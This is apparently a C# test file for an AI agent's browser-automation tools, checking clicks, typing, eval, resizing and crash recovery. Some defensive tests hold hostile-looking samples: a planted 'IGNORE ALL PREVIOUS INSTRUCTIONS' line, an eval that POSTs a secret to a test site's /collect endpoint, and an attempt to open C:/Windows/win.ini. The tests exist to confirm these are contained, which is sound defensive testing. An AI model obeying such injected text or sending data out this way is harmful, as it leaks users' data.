        var region = await T("browser_screenshot", ("region", $"{Img(40)},{Img(40)},{Img(160)},{Img(160)}"));
        Check("W3h", "region (previous image pixels) zooms in: mostly red", region.Success && Regex.IsMatch(region.Output, @"dominant colours #ff0000|dominant colours #ee0000|dominant colours #ff1100"), region.Output);
    }

    static async Task W4()
    {
        var text = await T("browser_read");
        Check("W4", "text mode has the Thai heading", text.Success && text.Output.Contains("เกมสนุ๊กเกอร์"), text.Output);
        int open = text.Output.IndexOf(UrlPolicy.EnvelopeOpenPrefix, StringComparison.Ordinal), close = text.Output.IndexOf(UrlPolicy.EnvelopeClosePrefix, StringComparison.Ordinal);
        int inj = text.Output.IndexOf("IGNORE ALL PREVIOUS INSTRUCTIONS", StringComparison.Ordinal);
        Check("W4b", "a prompt-injection sentence on the page comes back INSIDE the page-data envelope", open >= 0 && inj > open && inj < close, text.Output);
        var tree = await T("browser_read", ("mode", "tree"));
        Check("W4c", "tree mode: button \"Start\" with a ref, heading with its level, canvas with size + hint",
            Regex.IsMatch(tree.Output, "button \"Start\".*\\[ref_\\d+\\]") && tree.Output.Contains("heading \"เกมสนุ๊กเกอร์\" level=1") && Regex.IsMatch(tree.Output, @"canvas ""#game"" 400x200"), tree.Output);
        var inter = await T("browser_read", ("mode", "interactive"));
        Check("W4d", "interactive mode lists controls only (no heading, no static text)",
            inter.Output.Contains("button \"Start\"") && inter.Output.Contains("textbox") && !inter.Output.Contains("heading") && !inter.Output.Contains("text \""), inter.Output);
        var small = await T("browser_read", ("mode", "tree"), ("max_chars", "200"));
        Check("W4e", "max_chars is respected", Body(small.Output).Length <= 200 && small.Output.Contains("cut at 200"), small.Output);
        Check("W4f", "the password field's value is never read out", !tree.Output.Contains("hunter2"));
    }

    static string? StartRef;

    static async Task W5()
    {
        var f = await T("browser_find", ("query", "Start"));
        var m = Regex.Match(f.Output, @"(ref_\d+) button ""Start""");
        StartRef = m.Success ? m.Groups[1].Value : null;
        Check("W5", "browser_find returns a ref for the Start button", StartRef != null, f.Output);
        var c = await T("browser_click", ("ref", StartRef ?? "ref_0"));
        Check("W5b", "browser_click on the ref sets window.__clicked (a real, trusted click)", c.Success && await E("window.__clicked") == "1", Seen(c));
        await E("window.scrollTo(0,0); 1");
        await T("browser_screenshot");
        var cc = await T("browser_click", ("x", Img(120)), ("y", Img(80)));
        var json = await E("JSON.stringify(window.__clicks.at(-1))");
        bool ok = false;
        try
        {
            using var d = JsonDocument.Parse(json.Trim('"').Replace("\\\"", "\""));
            var root = d.RootElement;
            ok = Math.Abs(root.GetProperty("cx").GetDouble() - 120) <= 1 && Math.Abs(root.GetProperty("cy").GetDouble() - 80) <= 1 && root.GetProperty("trusted").GetBoolean();
        }
        catch { }
        Check("W5c", "a click at screenshot pixels lands on the canvas within ±1 CSS px, isTrusted", cc.Success && ok, json + "\n" + Seen(cc));
    }

    static async Task W6()
    {
        await E("window.__shots = []; 1");
        await T("browser_screenshot");
        var p = await T("browser_pointer", ("action", "drag"), ("x", Img(200)), ("y", Img(100)), ("to_x", Img(260)), ("to_y", Img(100)), ("hold_ms", "600"));
        var power = await E("window.__shots.length ? window.__shots[0].power : -1");
        Check("W6", "pointer drag with hold_ms=600 charges a shot: __shots[0].power > 0.5", p.Success && double.TryParse(power, System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out var pw) && pw > 0.5, power + "\n" + Seen(p));

        // Cancelled in the middle of a hold (the user pressed Stop): the button is released, never left down.
        await E("window.__seq = []; 1");
        bool cancelled = false;
        using (var cts = new CancellationTokenSource(400))
        {
            var call = new ToolCall { Type = ToolType.BrowserPointer, ToolName = "browser_pointer",
                Arguments = new() { ["action"] = "down", ["x"] = "300", ["y"] = "120", ["css"] = "true", ["hold_ms"] = "5000" } };
            try { await Module.ExecuteAsync(call, Ctx, cts.Token); }
            catch (OperationCanceledException) { cancelled = true; }
        }
        await Task.Delay(200);
        string seq = await E("window.__seq.join('')");
        Check("W6b", "a pointer hold cancelled mid-way propagates the cancel and still releases the button (mousedown then mouseup)", cancelled && seq == "\"du\"", $"cancelled={cancelled} seq={seq}");

        // Coordinates the model reads back parse the same in every locale.
        var saved = System.Globalization.CultureInfo.CurrentCulture;
        System.Globalization.CultureInfo.CurrentCulture = new System.Globalization.CultureInfo("de-DE");
        ToolResult dc;
        try { dc = await T("browser_click", ("x", "120.5"), ("y", "80.5"), ("css", "true")); }
        finally { System.Globalization.CultureInfo.CurrentCulture = saved; }
        Check("W6c", "under a de-DE culture, tool output still writes 120.5 (never 120,5)", dc.Success && dc.Output.Contains("(120.5,80.5)") && !dc.Output.Contains("120,5"), Seen(dc));
    }

    static string? NameRef;

    static async Task W7()
    {
        var f = await T("browser_find", ("query", "player name"));
        var m = Regex.Match(f.Output, @"(ref_\d+) textbox");
        NameRef = m.Success ? m.Groups[1].Value : null;
        var t = await T("browser_type", ("ref", NameRef ?? "ref_0"), ("text", "สวัสดี hello"));
        Check("W7", "browser_type 'สวัสดี hello' sets exactly that value (Thai through insertText)", t.Success && await E("document.getElementById('name').value") == "\"สวัสดี hello\"", Seen(t) + "\n" + f.Output);
        var k = await T("browser_key", ("keys", "Enter"));
        Check("W7b", "Enter in the field submits the form", await E("window.__submitted") == "\"สวัสดี hello\"", Seen(k));
        await E("document.getElementById('pw').value = 'hunter2'; 1");
        var pwFind = await T("browser_find", ("query", "pw"));
        var pr = Regex.Match(pwFind.Output, @"(ref_\d+) textbox");
        var pt = await T("browser_type", ("ref", pr.Success ? pr.Groups[1].Value : "ref_0"), ("text", "x"), ("clear", "true"));
        Check("W7c", "a password field on a LOCAL page may be typed into (the user's own app), and its value is never echoed",
            pt.Success && pt.Output.Contains("(value hidden)") && !pt.Output.Contains("hunter2"), Seen(pt));
        var none = await T("browser_type", ("text", "x"), ("ref", "ref_999999"));
        Check("W7d", "a stale ref is a clear, localized error", !none.Success && Seen(none).Contains("no longer points"), Seen(none));
    }

    static async Task W8()
    {
        await E("document.activeElement && document.activeElement.blur(); window.__keys = []; 1");
        await T("browser_key", ("keys", "ArrowLeft"), ("hold_ms", "300"));
        await T("browser_key", ("keys", "Space"));
        var keys = await E("JSON.stringify(window.__keys)");
        string expected = "[\"down:ArrowLeft:ArrowLeft\",\"up:ArrowLeft:ArrowLeft\",\"down: :Space\",\"up: :Space\"]";
        Check("W8", "ArrowLeft (held 300 ms) then Space arrive with the right key/code, keydown before keyup, in order — page hidden",
            keys.Trim('"').Replace("\\\"", "\"") == expected, keys);
        Check("W8b", "focus is emulated: document.hasFocus() is true and the page is not hidden",
            await E("document.hasFocus()") == "true" && await E("document.visibilityState") == "\"visible\"");
        var bad = await T("browser_key", ("keys", "Hyper+Q"));
        Check("W8c", "an unknown key is refused with examples", !bad.Success && Seen(bad).Contains("Unknown key"), Seen(bad));
    }

    static async Task W9()
    {
        await E("window.scrollTo(0,0); 1");
        var s = await T("browser_scroll", ("direction", "down"), ("amount", "5"));
        var y = await E("Math.round(window.scrollY)");
        Check("W9", "browser_scroll down 5 ticks moves scrollY and reports the new position", s.Success && int.TryParse(y, out var sy) && sy > 0 && s.Output.Contains("y 0 →"), s.Output + " scrollY=" + y);
        var r = await T("browser_scroll", ("ref", StartRef ?? "ref_0"));
        Check("W9b", "scroll with a ref brings that element into view", r.Success && await E("Math.round(document.getElementById('start').getBoundingClientRect().top) < innerHeight") == "true", Seen(r));
        await E("window.scrollTo(0,0); 1");
    }

    static async Task W10()
    {
        Check("W10", "eval 1+1 = 2", await E("1+1") == "2");
        Check("W10b", "eval with top-level await: fetch('/api/ping') → 200", await E("(await fetch('/api/ping')).status") == "200");
        var t = await T("browser_eval", ("expression", "throw new Error('boom')"));
        Check("W10c", "a thrown error comes back with its message and line (no doubled 'Error: Error:')", !t.Success && Seen(t).Contains("Error: boom (line 1)") && !Seen(t).Contains("Error: Error"), Seen(t));
        var t3 = await T("browser_eval", ("expression", "1;\n2;\nthrow new TypeError('third')"));
        Check("W10c2", "…the line is the line of the evaluated code (line 3)", !t3.Success && Seen(t3).Contains("TypeError: third (line 3)"), Seen(t3));
        var sw = Stopwatch.StartNew();
        var loop = await T("browser_eval", ("expression", "while(true){}"), ("timeout_ms", "1500"));
        sw.Stop();
        Check("W10d", "while(true){} is stopped: a timeout error within timeout + 2 s", !loop.Success && Seen(loop).Contains("Timed out") && sw.ElapsedMilliseconds < 3500, $"{sw.ElapsedMilliseconds} ms: {Seen(loop)}");
        Check("W10e", "…and the next eval works (the script was terminated)", await E("2+3") == "5");
        Check("W10f", "the page's own top-level let/const are visible (main world): __frames is a number", int.TryParse(await E("window.__frames"), out _));
        var obj = await E("({a:1, el: document.body, n: [1,2]})");
        Check("W10g", "objects are serialized as JSON (DOM nodes shown as <tag>)", obj.Contains("\"a\":1") && obj.Contains("<body>"), obj);
    }

    static async Task W11()
    {
        var r = await T("browser_resize", ("preset", "mobile"));
        Check("W11", "mobile: innerWidth 375, DPR 3, touch on", r.Success && r.Output.Contains("375x812") && r.Output.Contains("DPR 3") && r.Output.Contains("touch on"), Seen(r));
        Check("W11b", "the max-width:600px media query matches and touch is present",
            await E("matchMedia('(max-width: 600px)').matches") == "true" && await E("navigator.maxTouchPoints > 0") == "true");
        await E("window.scrollTo(0,0); window.__touches = []; 1");
        var d = await T("browser_pointer", ("action", "drag"), ("x", "100"), ("y", "100"), ("to_x", "200"), ("to_y", "100"), ("css", "true"));
        var touches = await E("window.__touches.join(',')");
        Check("W11c", "a drag under mobile emulation fires touchstart, touchmove, touchend", d.Success && touches.Contains("start") && touches.Contains("move") && touches.EndsWith("end\""), touches);
        var shot = await T("browser_screenshot");
        var si = shot.Images?.FirstOrDefault();
        Check("W11d", "a mobile screenshot (375×812 @3) stays within the limits", si != null && Math.Max(si.Width, si.Height) <= 1568 && si.Width * si.Height <= 1_150_000, si?.ToString() ?? "");
        var back = await T("browser_resize", ("preset", "desktop"));
        Check("W11e", "desktop restores 1280 css px and no touch", back.Success && back.Output.Contains("1280x800") && back.Output.Contains("touch off") && await E("matchMedia('(max-width: 600px)').matches") == "false", Seen(back));
    }

    static async Task W12()
    {
        var f = await T("browser_find", ("query", "Alert"));
        var m = Regex.Match(f.Output, @"(ref_\d+) button ""Alert""");
        var c = await T("browser_click", ("ref", m.Success ? m.Groups[1].Value : "ref_0"));
        Check("W12", "alert('Game over') is auto-dismissed and reported", c.Success && c.Output.Contains("Dialog alert \"Game over\" — dismissed automatically"), Seen(c));
        var sw = Stopwatch.StartNew();
        Check("W12b", "the page stays responsive right after (eval answers fast)", await E("40+2") == "42" && sw.ElapsedMilliseconds < 3000, $"{sw.ElapsedMilliseconds} ms");
        int fr = await Frames();
        Check("W12c", "…and its frame loop still runs (≥ 15 rAF in 500 ms)", fr >= 15, $"frames={fr}");
    }

    static async Task W13(PermissionService perms)
    {
        var session = Browser.Session!;
        string site = Server.Ext("site");
        Answer = false;
        int prompts = Prompts.Count;
        var call = new ToolCall { Type = ToolType.BrowserOpen, ToolName = "browser_open", Arguments = new() { ["url"] = site + "/" } };
        var denied = await Svc.ExecuteToolAsync(call, CancellationToken.None);
        Answer = true;
        Check("W13", "browser_open of an external site through AgentToolService asks (scope browse) and a No refuses it",
            !denied.Success && Seen(denied).Contains("browse: " + site + "/") && Prompts.Count == prompts + 1, Seen(denied));
        Check("W13b", "…and NO request reached that site (the fixture server's own log for site.ext.test)", !Server.Saw("site.ext.test") && session.CurrentUrl.StartsWith(BaseUrl), Server.Hits("site.ext.test"));

        var ev = Svc.EvaluatePermission(new ToolCall { Type = ToolType.BrowserOpen, ToolName = "browser_open", Arguments = new() { ["url"] = BaseUrl + "/" } });
        var evx = Svc.EvaluatePermission(new ToolCall { Type = ToolType.BrowserOpen, ToolName = "browser_open", Arguments = new() { ["url"] = site + "/" } });
        var rule = new PermissionRule { Pattern = "http://127.0.0.1*", Scope = "browse", Action = PermAction.Deny };
        perms.AddRule(rule);
        PermAction denyLocal;
        try { denyLocal = Svc.EvaluatePermission(new ToolCall { Type = ToolType.BrowserOpen, ToolName = "browser_open", Arguments = new() { ["url"] = BaseUrl + "/" } }).Action; }
        finally { perms.RemoveRule(rule); }
        Check("W13c", "permissions: a local page is free (Allow), an external one asks, and a user's Deny URL rule beats 'free'",
            ev.Action == PermAction.Allow && evx.Action == PermAction.Ask && evx.Scope == "browse" && denyLocal == PermAction.Deny, $"{ev} | {evx} | {denyLocal}");

        var f = await T("browser_find", ("query", "example link"));
        var m = Regex.Match(f.Output, @"(ref_\d+) link");
        var click = await T("browser_click", ("ref", m.Success ? m.Groups[1].Value : "ref_0"));
        await Task.Delay(300);
        Check("W13d", "clicking a link to an external site is cancelled before it is sent (the server never saw it) and reported; the page stays",
            click.Output.Contains("Navigation blocked: " + site + "/") && session.CurrentUrl.StartsWith(BaseUrl) && !Server.Saw("site.ext.test"),
            Seen(click) + $"\nurl now {session.CurrentUrl}\nhits: {Server.Hits("site.ext.test")}");
        var pop = await T("browser_find", ("query", "Popup"));
        var pm = Regex.Match(pop.Output, @"(ref_\d+) button ""Popup""");
        var popc = await T("browser_click", ("ref", pm.Success ? pm.Groups[1].Value : "ref_0"));
        await Task.Delay(300);
        Check("W13e", "window.open is contained (no new window, nothing sent) and reported", popc.Output.Contains("Pop-up blocked (contained): " + site + "/popup") && !Server.Saw("/popup"), Seen(popc));
        var exfil = await T("browser_eval", ("expression", $"await fetch('{site}/collect', {{ method: 'POST', body: 'secret' }}).then(r => r.status, e => 'rejected')"));
        await Task.Delay(300);
        var exCon = await T("browser_console", ("since", "last"), ("level", "error"));
        Check("W13j", "eval on a LOCAL page (free) cannot POST to an unapproved site: answered locally (403), never sent, and the console names the approval path (allow=)",
            Body(exfil.Output) == "403" && exCon.Output.Contains("CluadeX blocked") && exCon.Output.Contains("allow=\"" + site + "\"") && !Server.Saw("/collect"),
            Seen(exfil) + "\n" + exCon.Output + "\nhits: " + Server.Hits("collect"));

        var outside = await T("browser_open", ("url", "file:///C:/Windows/win.ini"));
        Check("W13f", "file:// outside the project is refused (localized), nothing loaded", !outside.Success && Seen(outside).Contains("outside the open project") && session.CurrentUrl.StartsWith(BaseUrl), Seen(outside));
        var inside = await T("browser_open", ("url", Path.Combine(Project, "other.html")));
        Check("W13g", "a project file (plain path → file://) opens", inside.Success && inside.Output.Contains("title \"Other\""), Seen(inside));
        var js = await T("browser_open", ("url", "javascript:alert(1)"));
        Check("W13h", "javascript: is refused", !js.Success && Seen(js).Contains("javascript:"), Seen(js));

        // A project page that pulls a file from OUTSIDE the project: refused, and the console says how to fix it.
        string outsideDir = Path.Combine(ExeDir, "outside-" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(outsideDir);
        try
        {
            File.WriteAllText(Path.Combine(outsideDir, "secret.js"), "window.__secret = 'TOPSECRET';");
            File.WriteAllText(Path.Combine(Project, "pulls-outside.html"),
                $"<!doctype html><html><head><meta charset=\"utf-8\"><title>pulls</title><script src=\"{new Uri(Path.Combine(outsideDir, "secret.js")).AbsoluteUri}\"></script></head><body>p</body></html>");
            var po = await T("browser_open", ("url", Path.Combine(Project, "pulls-outside.html")));
            string secret = await E("String(window.__secret)");
            var poc = await T("browser_console", ("level", "error"));
            Check("W13l", "a project page's <script src=file:///…outside…> is refused, and the console says to copy it into the project or serve it (not 'open it with browser_open')",
                po.Success && secret == "\"undefined\"" && poc.Output.Contains("outside the open project") && poc.Output.Contains("bg_serve") && !poc.Output.Contains("allow=\""),
                $"secret={secret}\n{poc.Output}");
        }
        finally { try { Directory.Delete(outsideDir, true); } catch { } }

        var back = await T("browser_open", ("url", BaseUrl + "/index.html"));
        int fr = await Frames();
        Check("W13i", "back on the fixture after file:// pages (new renderer processes): the frame loop runs", back.Success && fr >= 15, $"frames={fr}\n{Seen(back)}");

        // Approvals belong to a chat: another chat driving the page does not inherit them — and switching back
        // restores them (nothing is cleared).
        const string approved = "https://approved.ext.test";
        Browser.ApproveForChat("browsertest", approved);
        await TIn(new ToolModuleContext { SessionKey = "another-chat", WorkingDirectory = Project, ShellDirectory = Project }, "browser_console");
        bool inOther = Browser.PageMayContact(approved);
        await T("browser_console");
        bool back2 = Browser.PageMayContact(approved);
        Check("W13k", "a site approved in one chat is not approved while another chat drives the page, and is again when the first chat comes back",
            !inOther && back2 && Browser.IsApprovedForChat("browsertest", approved) && !Browser.IsApprovedForChat("another-chat", approved), $"other={inOther} back={back2}");
    }
    static async Task W14()
    {
        var session = Browser.Session!;
        try { await session.SendAsync("Page.crash", null, CancellationToken.None, TimeSpan.FromSeconds(3)); } catch { /* the renderer dies under the call */ }
        bool crashed = await WaitUntil(() => session.IsCrashed, 8000);
        Check("W14", "Page.crash is noticed (ProcessFailed / targetCrashed)", crashed);
        var read = await T("browser_read");
        Check("W14b", "tools on the crashed page say so, localized (not a raw exception)", !read.Success && Seen(read).Contains("crashed") && !Seen(read).Contains("Exception"), Seen(read));
        var con = await T("browser_console", ("level", "error"));
        Check("W14c", "the console records the crash", con.Output.Contains("crash"), con.Output);
        var re = await T("browser_open", ("url", BaseUrl + "/index.html"));
        Check("W14d", "browser_open recovers: page loads, eval works", re.Success && re.Output.Contains("HTTP 200") && await E("1+1") == "2", Seen(re));
        await Task.Delay(300);
        var c2 = await T("browser_console", ("since", "navigation"));
        Check("W14e", "…and console capture works again on the new renderer ('boot')", c2.Output.Contains("[log] boot"), c2.Output);
        int fr = await Frames();
        Check("W14f", "…and the new renderer's frame loop runs (≥ 15 rAF in 500 ms)", fr >= 15, $"frames={fr}");
    }

    static async Task W15()
    {
        await E("window.scrollTo(0,0); window.__seq = []; 1");
        var reads = new[] { "browser_console", "browser_network", "browser_read", "browser_find", "browser_screenshot" };
        var tasks = new List<Task<ToolResult>>();
        for (int i = 0; i < 20; i++)
        {
            string tool = reads[i % reads.Length];
            tasks.Add(Task.Run(() => tool == "browser_find" ? T(tool, ("query", "Start")) : T(tool)));
            if (i % 7 == 3)
                tasks.Add(Task.Run(() => T("browser_pointer", ("action", "press"), ("x", "300"), ("y", "120"), ("css", "true"), ("hold_ms", "30"))));
        }
        var all = Task.WhenAll(tasks);
        bool done = await Task.WhenAny(all, Task.Delay(60_000)) == all;
        Check("W15", $"{tasks.Count} parallel calls (20 reads + 3 presses) from pool threads finish — no deadlock", done && all.Result.All(r => r.Success),
            done ? string.Join("\n", all.Result.Where(r => !r.Success).Select(Seen)) : "timed out");
        var seq = await E("window.__seq.join('')");
        Check("W15b", "the presses kept their event order (mousedown/mouseup never interleaved)", seq == "\"dududu\"", seq);
    }

    static async Task S1()
    {
        const string clone = @"D:\Code\snooker-cluadex-test";
        string index = Path.Combine(clone, "index.html");
        if (!File.Exists(index)) { Gap("S1", "Snooker smoke", "the safe clone is not on this machine"); return; }
        string before = GitStatus(clone);
        var ctx = new ToolModuleContext { SessionKey = "browsertest-snooker", WorkingDirectory = clone, ShellDirectory = clone, OutputBudgetChars = 30_000 };
        var open = await TIn(ctx, "browser_open", ("url", new Uri(index).AbsoluteUri));
        Check("S1", "the Snooker clone opens from file:// (project = the clone)", open.Success && open.Output.Contains("Opened file:///"), Seen(open));
        Console.WriteLine($"  info  S1    off-screen frame-loop guard fired on open: {(open.Output.Contains("woken up") ? "yes" : "no")}");
        await E("document.getElementById('instructions').style.display = 'none'; 1", ctx);
        string state = await E("JSON.stringify([gameMode, balls.length])", ctx);
        Check("S1b", "eval in the main world reads the game's top-level let: [gameMode, balls.length] = ['snooker', 21]", state.Replace("\\\"", "\"").Contains("[\"snooker\",21]"), state);
        string cue = await E("JSON.stringify((() => { const r = canvas.getBoundingClientRect(); return { x: r.left + 4 + cueBall.x, y: r.top + 4 + cueBall.y }; })())", ctx);
        double cx = 0, cy = 0;
        try { using var d = JsonDocument.Parse(cue.Trim('"').Replace("\\\"", "\"")); cx = d.RootElement.GetProperty("x").GetDouble(); cy = d.RootElement.GetProperty("y").GetDouble(); } catch { }
        string ax = N(cx + 150), ay = N(cy);
        int sfr = await Frames(ctx);
        Check("S1g", "the game's frame loop runs off-screen (≥ 15 rAF in 500 ms)", sfr >= 15,
            $"frames={sfr} visibility={await E("document.visibilityState", ctx)} focus={await E("document.hasFocus()", ctx)} kicked={open.Output.Contains("woken up")}");
        // Diagnostics only (page state, never the clone's files): which element each real event reached.
        await E("window.__ev = []; ['mousemove','mousedown','mouseup'].forEach(t => window.addEventListener(t, e => window.__ev.push(t + '>' + (e.target.id || e.target.tagName)), true)); 1", ctx);
        await TIn(ctx, "browser_pointer", ("action", "move"), ("x", ax), ("y", ay), ("css", "true"));
        await TIn(ctx, "browser_pointer", ("action", "down"), ("x", ax), ("y", ay), ("css", "true"), ("hold_ms", "600"));
        string charging = await E("JSON.stringify({powerCharging, power, isAiming, ballsMoving, currentPlayer, playerMode})", ctx);
        var up = await TIn(ctx, "browser_pointer", ("action", "up"), ("x", ax), ("y", ay), ("css", "true"));
        string moving = await E("ballsMoving", ctx);
        string events = await E("window.__ev.slice(-6).join(' ')", ctx);
        Check("S1c", "browser_pointer move → down → hold 600 ms → up plays a shot: ballsMoving = true", up.Success && moving == "true",
            $"cue={cue} while held={charging} moving={moving} events={events}\n{Seen(up)}");
        var shot = await TIn(ctx, "browser_screenshot");
        Check("S1d", "the screenshot digest says the game canvas is not blank", Regex.IsMatch(shot.Output, @"Canvas #gameCanvas.*NOT blank"), shot.Output);
        var errs = await TIn(ctx, "browser_console", ("level", "error"));
        Check("S1e", "the console has 0 errors", errs.Output.Contains(": 0 line(s)"), errs.Output);
        Check("S1f", "the harness wrote nothing into the clone (git status unchanged)", GitStatus(clone) == before, before + " → " + GitStatus(clone));
    }

    static string GitStatus(string dir)
    {
        try
        {
            var psi = new ProcessStartInfo("git", $"-C \"{dir}\" status --porcelain") { UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true };
            using var p = Process.Start(psi)!;
            string o = p.StandardOutput.ReadToEnd();
            p.WaitForExit(10_000);
            return o.Trim();
        }
        catch (Exception ex) { return "git unavailable: " + ex.Message; }
    }

    static async Task I1()
    {
        var r = await T("browser_open", ("url", "bg:7"));
        Check("I1a", "url=bg:N without a background service is a clear 'unknown background process' error", !r.Success && Seen(r).Contains("Unknown background process \"7\""), Seen(r));
        Gap("I1", "bg_serve then browser_open url=bg:N", "needs team T2's BackgroundProcessService (an IBrowserUrlResolver adapter) — runs after the T2 merge");
    }

    static async Task W16(string udf)
    {
        var shot = Browser.Channel?.BrowserProcessId ?? 0;
        int before = WebViewProcesses(udf).Count;
        var channel = Browser.Channel;
        Browser.Dispose();
        bool exited = channel?.BrowserExitObserved == true;
        var sw = Stopwatch.StartNew();
        List<int> left = WebViewProcesses(udf);
        while (left.Count > 0 && sw.ElapsedMilliseconds < 5000) { await Task.Delay(250); left = WebViewProcesses(udf); }
        Check("W16", $"Dispose leaves no msedgewebview2.exe for the temp profile within 5 s ({before} before, browser pid {shot})", before > 0 && left.Count == 0,
            $"before={before} exitEvent={exited} left:\n" + string.Join("\n", left.Select(DescribeProcess)));
    }

    static string DescribeProcess(int pid)
    {
        try
        {
            using var searcher = new ManagementObjectSearcher($"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {pid}");
            foreach (ManagementObject mo in searcher.Get())
            {
                string cmd = mo["CommandLine"] as string ?? "";
                var type = Regex.Match(cmd, @"--type=([\w-]+)");
                return $"{pid} {(type.Success ? type.Groups[1].Value : "browser")} {Trunc(cmd, 160)}";
            }
        }
        catch { }
        return pid + " (gone)";
    }

    static List<int> WebViewProcesses(string udf)
    {
        var list = new List<int>();
        try
        {
            using var searcher = new ManagementObjectSearcher("SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name = 'msedgewebview2.exe'");
            foreach (ManagementObject mo in searcher.Get())
            {
                string cmd = mo["CommandLine"] as string ?? "";
                if (cmd.Contains(udf, StringComparison.OrdinalIgnoreCase)) list.Add(Convert.ToInt32(mo["ProcessId"]));
                mo.Dispose();
            }
        }
        catch { }
        return list;
    }
}
